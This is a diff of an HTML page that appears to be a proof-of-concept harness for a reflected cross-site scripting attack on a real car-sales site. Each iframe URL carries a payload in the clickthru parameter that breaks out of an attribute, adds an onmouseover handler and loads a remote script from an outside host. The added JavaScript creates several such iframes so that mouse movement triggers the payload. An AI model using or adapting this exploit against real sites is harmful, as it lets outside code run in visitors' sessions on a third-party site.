@@ -17,22 +17,26 @@
     </style>
 </head>
 <body>
-    <iframe src="https://www.sauto.cz/bannerova-reklama?perPage=1&banner=1&clickthru=/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz.vercel.app//index.js%27);%20document.head.appendChild(s)" frameborder="0"></iframe>
+    <iframe scrolling="no" src="https://www.sauto.cz/bannerova-reklama?perPage=1&banner=1&clickthru=/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz.vercel.app//index.js%27);%20document.head.appendChild(s)" frameborder="0"></iframe>
 
-<!--    <script>-->
-<!--        document.addEventListener("mousemove", mouse);-->
-<!--        // document.addEventListener('click', mouse);-->
-<!--        function mouse(e) {-->
-<!--            console.log(e);-->
+    <script>
 
-<!--            const top = e.pageY;-->
-<!--            const left = e.pageX - (318/2);-->
-<!--            // 298(+20) x 94-->
-<!--            window.open(-->
-<!--                "https://www.sauto.cz/bannerova-reklama?perPage=1&banner=1&clickthru=/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz.vercel.app//index.js%27);%20document.head.appendChild(s)",-->
-<!--                "_blank",-->
-<!--                "width=318,height=94,menubar=no,scrollbars=no,status=no,titlebar=no,toolbar=no,top=" + top + ",left=" + left);-->
-<!--        }-->
-<!--    </script>-->
+        const w = window.innerWidth;
+        const h = window.innerHeight;
+
+        createIframe(0, 0);
+        createIframe(300, 300);
+
+        function createIframe(x, y) {
+            const src = "https://www.sauto.cz/bannerova-reklama?perPage=1&banner=1&clickthru=/%22onmouseover=%22let%20s%20=%20document.createElement(%27script%27);%20s.setAttribute(%27src%27,%27https://whitehat-email-cz.vercel.app//index.js%27);%20document.head.appendChild(s)";
+            const iframe = document.createElement("iframe");
+            iframe.setAttribute("scrolling", "no");
+            iframe.src = src;
+            iframe.style.left = x + "px";
+            iframe.style.top = y + "px";
+            iframe.setAttribute("frameborder", "0");
+            document.body.appendChild(iframe);
+        }
+    </script>
 </body>
 </html>
